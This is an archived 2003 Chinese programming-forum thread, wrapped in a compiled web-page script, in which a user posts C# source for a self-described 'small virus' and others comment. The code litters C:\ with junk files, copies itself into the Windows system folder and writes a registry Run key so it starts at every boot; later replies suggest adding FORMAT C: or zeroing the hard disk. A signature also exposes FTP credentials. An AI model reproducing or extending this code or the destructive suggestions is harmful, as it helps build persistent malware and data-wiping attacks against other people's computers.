import{_ as n,o as s,c as a,a as t}from"./app-a2b6e588.js";const p={},o=t(`<h1 id="一个小病毒源代码-没事做写着玩" tabindex="-1"><a class="header-anchor" href="#一个小病毒源代码-没事做写着玩" aria-hidden="true">#</a> 一个小病毒源代码，没事做写着玩</h1><div class="language-txt" data-ext="txt"><pre class="language-txt"><code>tpoi
头衔：TPoI.net
等级：新手上路
财产：1260
经验：475
魅力：250
注册：2002-9-24
登录：2003-4-17
文章：46
签定：★不明36★
</code></pre></div><p>[原创]一个小病毒源代码，没事做写着玩</p><p>以下内容为程序代码：</p><div class="language-csharp" data-ext="cs"><pre class="language-csharp"><code><span class="token keyword">using</span> <span class="token namespace">System</span><span class="token punctuation">;</span>
<span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>IO</span><span class="token punctuation">;</span>
<span class="token keyword">using</span> <span class="token namespace">Microsoft<span class="token punctuation">.</span>Win32</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FileClass</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">AppendToFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//产生垃圾文件 </span>
        <span class="token function">CopyF</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//将文件COPY到一个别人找不到的地方 </span>
        <span class="token function">MendReg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//修改注册表，让你每次开机都运行 </span>
    <span class="token punctuation">}</span>
    <span class="token keyword">static</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">AppendToFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token class-name">StreamWriter</span> SW<span class="token punctuation">;</span> <span class="token comment">//StreamWriter类是专门修改，创建文件的 </span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name"><span class="token keyword">int</span></span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            SW <span class="token operator">=</span> File<span class="token punctuation">.</span><span class="token function">CreateText</span><span class="token punctuation">(</span><span class="token string">&quot;c:\\\\tpoi&quot;</span> <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token string">&quot;.ini&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//创建i个INI文件 </span>
            SW<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">&quot;ECHO TPoI Hacked&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//写入的文件内容 </span>
            SW<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">&quot;Pause &gt;&gt;&gt;nul&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            SW<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//关闭,即存入 </span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">static</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">CopyF</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token class-name"><span class="token keyword">string</span></span> Fullpath<span class="token punctuation">;</span>
        Fullpath <span class="token operator">=</span> Path<span class="token punctuation">.</span><span class="token function">GetFullPath</span><span class="token punctuation">(</span><span class="token string">&quot;tpoi.exe&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//获取tpoi.exe文件的目录 </span>
        File<span class="token punctuation">.</span><span class="token function">Copy</span><span class="token punctuation">(</span>Fullpath<span class="token punctuation">,</span> <span class="token string">&quot;c:\\\\windows\\\\system\\\\tpoi.exe&quot;</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//从获取的目录中COPY到c:\\windows\\system } </span>
        <span class="token keyword">static</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">MendReg</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token class-name">RegistryKey</span> RegMain <span class="token operator">=</span> Registry<span class="token punctuation">.</span>LocalMachine<span class="token punctuation">;</span> <span class="token comment">//创建RegMain在注册表中的LocalMachine </span>
            <span class="token class-name">RegistryKey</span> RegRun <span class="token operator">=</span> RegMain<span class="token punctuation">.</span><span class="token function">CreateSubKey</span><span class="token punctuation">(</span><span class="token string">&quot;Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//创建RegRun在注册表中的Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run </span>
            RegRun<span class="token punctuation">.</span><span class="token function">Setvalue</span><span class="token punctuation">(</span><span class="token string">&quot;tpoi&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;C:\\\\windows\\\\system\\\\tpoi.exe&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//加入值 </span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre></div><p>比较幼稚的程序，不要见笑</p><hr><div class="language-txt" data-ext="txt"><pre class="language-txt"><code>WS.NET
等级：侠圣
财产：11120
经验：82342
魅力：7480
注册：2002-9-13
登录：2003-4-23
文章：2468
签定：★不明32★
</code></pre></div><p>第一次见到C#病毒，不简单呀！<br> 恭喜了！</p><hr><p>tpoi</p><blockquote><p>别笑我，这不叫病毒</p></blockquote><hr><p>WS.NET</p><blockquote><p>准病毒？<br> 假病毒</p></blockquote><hr><p>tpoi</p><blockquote><p>没破坏性，只是可以让人烦恼\`\`</p></blockquote><hr><div class="language-txt" data-ext="txt"><pre class="language-txt"><code>wenlj00
头衔：书虫
等级：贵宾
财产：35008
经验：36596
魅力：5714
注册：2002-8-5
登录：2003-3-23
文章：2735
签定：北京西区22号楼(宿舍楼)
</code></pre></div><p>自己玩还差不多</p><p>请留意我的ftp，为您提供最新最好的DotNet英文书下载</p><p>ftp://book:goodbook@166.111.68.101:1221/</p><hr><div class="language-txt" data-ext="txt"><pre class="language-txt"><code>GuoJing
等级：论坛游侠
财产：5290
经验：1270
魅力：858
注册：2002-9-12
登录：2003-4-23
文章：147
签定：广东省深圳市
</code></pre></div><p>以下内容为引用：</p><div class="language-txt" data-ext="txt"><pre class="language-txt"><code>Re:[原创]一个小病毒源代码，没事做写着玩
自己玩　还差不多
</code></pre></div><p>我看是　玩自己　；））））</p><hr><div class="language-txt" data-ext="txt"><pre class="language-txt"><code>冲动的小李
等级：新手上路
财产：1736
经验：338
魅力：316
注册：2002-8-7
登录：2003-4-6
文章：73
签定：重庆市
</code></pre></div><p>的确8算病毒，没有传染性，而且只能在装了framework的机器上发作，还要人手工运行，片人家运行还要花一番口舌</p><hr><div class="language-txt" data-ext="txt"><pre class="language-txt"><code>小宝.NET
头衔：ASP.NET破坏王
等级：总版主
财产：26778
经验：10541
魅力：5412
注册：2002-8-2
登录：2003-4-22
文章：1359
签定：广东省广州市长城宽带
</code></pre></div><p>可再来个毒点的，FORMAT C：</p><hr><div class="language-txt" data-ext="txt"><pre class="language-txt"><code>fish 
头衔：.NET 才子
等级：侠圣
财产：10875
经验：23009
魅力：3588
注册：2002-8-20
登录：2003-4-5
文章：1044
签定：浙江省宁波
</code></pre></div><p>再毒一点，用debug,把硬盘数据全清零！，完全粉碎!!且不能启动</p>`,37),e=[o];function c(u,l){return s(),a("div",null,e)}const k=n(p,[["render",c],["__file","safe2.html.vue"]]);export{k as default};
